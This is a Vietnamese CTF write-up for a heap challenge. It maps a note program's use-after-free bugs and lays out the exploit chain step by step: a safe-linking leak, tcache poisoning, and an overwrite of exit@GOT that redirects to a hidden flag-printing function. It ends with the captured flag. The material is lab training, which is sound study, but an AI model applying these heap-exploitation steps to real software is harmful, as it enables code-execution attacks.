# Notes — Loose Ends

## Cấu trúc chương trình

```
notes[16] @ 0x4040a0 (BSS)          mỗi phần tử là con trỏ malloc(0x50)
menu()   @ 0x401358   puts + printf("> ") + fgets(0x10) + atoi
idx()    @ 0x4013df   đọc số, trả -1 nếu <0 hoặc >15
audit()  @ 0x4012b6   fopen("/flag","r"); fgets(buf,0x50); fclose; printf("[audit] %s\n")
main()   @ 0x401470   setvbuf(stdout,0,_IONBF,0); jump table @0x402074
```

Bốn nhánh của menu:

| Lựa chọn | Code | Lỗi |
| --- | --- | --- |
| 1 add | `notes[i]=malloc(0x50); read(0,notes[i],0x50)` | |
| 2 delete | `free(notes[i])` | **không gán `notes[i]=NULL`** -> dangling pointer |
| 3 edit | nếu `notes[i]` khác 0: `read(0,notes[i],0x50)` | **UAF write** |
| 4 view | nếu `notes[i]` khác 0: `write(1,notes[i],0x50)` | **UAF read, 80 byte thô** |

`audit` không xuất hiện trong jump table của menu -> "nobody has ever bothered to call".

## Vì sao không cần leak libc

- Không PIE: `audit` và toàn bộ GOT là địa chỉ cố định.
- Heap cũng không random hoá: chunk đầu tiên ở `0x4062b0` (brk ngay sau BSS). Bằng chứng lấy từ chính vụ leak: `view(0)` sau `delete(0)` trả 8 byte đầu = `0x406` = `A>>12`, và `view(3)` tại `0x404060` cho thấy `notes[0]=0x4062b0`, `notes[1]=0x406310` (cách nhau đúng 0x60).
- RELRO kết thúc ở `0x404000`, nên `free/puts/write/fclose/printf/read/fgets/malloc/setvbuf/fopen/atoi/exit@GOT` (0x404000..0x404060) đều ghi được.

## Chuỗi đã dùng

```
add(0)=A ; add(1)=B
delete(0)                 # A vào tcache, 8 byte đầu = (A>>12)^0 = 0x406
view(0)                   # leak t = 0x406
delete(1)                 # B vào tcache, head -> B
edit(1, p64(t ^ 0x404060))# ghi đè fd của B (safe-linking: real = (B>>12)^stored)
add(2)                    # pop B
add(3)                    # pop 0x404060 -> notes[3] = exit@GOT
edit(3, p64(0x4012b6))    # exit@GOT = audit
shutdown(SHUT_WR)         # menu: fgets trả NULL -> exit(0) -> audit -> in flag
```

Chọn `exit@GOT` (0x404060) chứ không phải `free@GOT` (0x404000): khi pop một entry, glibc ghi ngược `next`/`key` vào chính chunk đó, tức là viết tại `0x404060+8 = 0x404068` thuộc `.data` (vô hại). Nếu nhắm 0x404000 thì slot `puts@GOT` ở 0x404008 có thể bị xoá, mà menu gọi `puts` ngay sau đó.

## Bẫy đã gặp

1. `read(0, ptr, 0x50)` chỉ lấy số byte có thật trong hàng đợi, nên muốn ghi đúng 8 byte thì gửi đúng 8 byte. Đây là lý do không cần lo phần 72 byte còn lại của buffer.
2. `audit()` `ret` về đúng sau `call exit` trong menu, và stdin đã EOF -> vòng lặp `menu -> exit -> audit -> menu` chạy vô hạn và in flag liên tục. Vòng `recv()` "cho tới khi im lặng" vì thế không bao giờ kết thúc (biểu hiện: script treo tới timeout). Phải đọc có trần số byte và dừng ngay khi regex khớp.
3. Chạy Python với output là pipe thì stdout bị block-buffer; cần `python -u` để không mất log khi tiến trình bị kill.

## Kết quả

```
[audit] H7CTF{4d0e9693-88bd-4749-87d8-c64dd2ef80ab}
```
